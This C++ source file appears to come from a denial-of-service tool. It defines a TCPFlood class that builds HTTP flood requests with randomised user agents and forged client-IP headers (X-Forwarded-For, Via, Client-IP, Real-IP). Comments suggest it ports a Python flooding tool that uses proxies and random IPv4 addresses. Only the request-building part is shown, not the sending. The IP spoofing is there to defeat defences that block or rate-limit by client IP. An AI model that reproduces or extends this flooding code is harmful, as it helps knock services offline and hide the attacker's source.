#include "../include/TCPFlood.h"

namespace cotton {
const string& TCPFlood::getHeader() const { return this->header; }

const string& TCPFlood::getRequest() const { return this->request; }

const string& TCPFlood::getDefaultHeader() const { return this->defaultHeader; }

void TCPFlood::updateDefaultHeader(string ip, string origin, string raw_authority)
{
    // TODO: find out parsing similar to Python's YARL
	// compile default header
	
	//ProxyManager* proxyManager = ProxyManager::getInstance();
	//string ip = proxyManager->getRandomIPv4(); //   ip: str = Tools.rand_ipv4()
    //string ip = "123.123.123.123";
    //string origin = "111.222.000.111"; //    origin = str(self._url.origin())
    //string raw_authority = "111.111.111.111"; // self._url.raw_authority
    string user_agent =  USERAGENTS[rand() % USERAGENTS.size()];
    
    this->defaultHeader = flood::TCPHeaderBase
		+ "Host: " + raw_authority + rn
        + "Origin: " + origin + rn
        + "Referer: " + origin + rn // emulate Referrer-Policy: origin
        + "User-Agent: " + user_agent + rn
        + "X-Forwarded-Host: " + raw_authority + rn
        + "Via: " + ip + rn
        + "Client-IP: " + ip + rn
        + "X-Forwarded-Proto: " + "https" + rn
        + "X-Forwarded-For: "+ ip + rn
        + "Real-IP: " + ip
    ;
}

void TCPFlood::updateRequest(flood::RequestType reqestType, string qsPathRaw, string body)
{
	// method is unsafe because assumes header is already created and request type is valid
	this->request += flood::RequestTypeStr.at(reqestType);
	this->request += " ";
	this->request += qsPathRaw;
	this->request += " HTTP/1.1" + rn;
	this->request += this->header;
	this->request += rn + rn;
	this->request += body;
}


void TCPFlood::updateHeader(string headers)
{
		this->header = headers;
}
}